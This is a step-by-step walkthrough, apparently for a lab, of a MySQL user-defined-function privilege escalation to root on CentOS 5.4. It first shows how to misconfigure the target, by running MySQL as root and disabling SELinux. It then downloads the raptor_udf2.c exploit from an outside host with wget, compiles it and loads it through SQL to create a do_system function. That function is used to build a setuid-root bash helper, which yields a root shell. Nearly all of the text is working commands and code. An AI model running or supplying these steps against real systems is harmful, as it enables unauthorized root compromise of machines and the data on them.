========================================================================
CentOS 5.4 MySQL User Defined Function Privilege Escalation Exploitation
========================================================================

------------
Requirements
------------

The following needs to be reproduced for successful exploitation and privilege
escalation to root (unless target machine is already vulnerable/misconfigured):

 -Stop MySQL (if running): 
   ~$ sudo /etc/init.d/mysqld stop

 -Change MySQL service data directory permission:
   ~$ sudo chown -R root:root /var/lib/mysql

 -Edit the file /etc/my.cnf (using sudo), and change the line:
    user=mysql
 -to:
    user=root
 -and save the file.

 -Start the MySQL service:
   ~$ sudo /etc/init.d/mysqld start

 -Turn off selinux (if applicable):
   ~$ sudo /usr/sbin/setenforce 0

 -Install wget and gcc:
   ~$sudo yum install wget gcc

No reboot is required.
The machine should now be vulnerable to MySQL UDF Privilege Escalation.


-------------
Exploitation
-------------
~$ wget http://0xdeadbeef.info/exploits/raptor_udf2.c
~$ gcc -g -c raptor_udf2.c
~$ gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_df2.so raptor_udf2.o -lc
~$ mysql -u root

mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file(‘/home/raptor/raptor_udf2.so’));
mysql> select * from foo into dumpfile ‘/usr/lib/raptor_udf2.so’;
mysql> create function do_system returns integer soname ‘raptor_udf2.so’;
mysql> select * from mysql.func;
mysql> exit

-Create a file named "setuid.c" with the following C code in your home directory:

...snip...

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
setuid(0); setgid(0); system("/bin/bash");
}

...snip...

~$ mysql -u root

mysql> use mysql;
mysql> select do_system('gcc -o /tmp/setuid /home/centos/setuid.c');
mysql> select do_system('chmod u+s /tmp/setuid');
mysql> exit

~$ /tmp/setuid
~# whoami
root

======================================================================================

Credits to raptor <raptor@0xdeadbeef.info> for the raptor_udf2.c UDF source code.
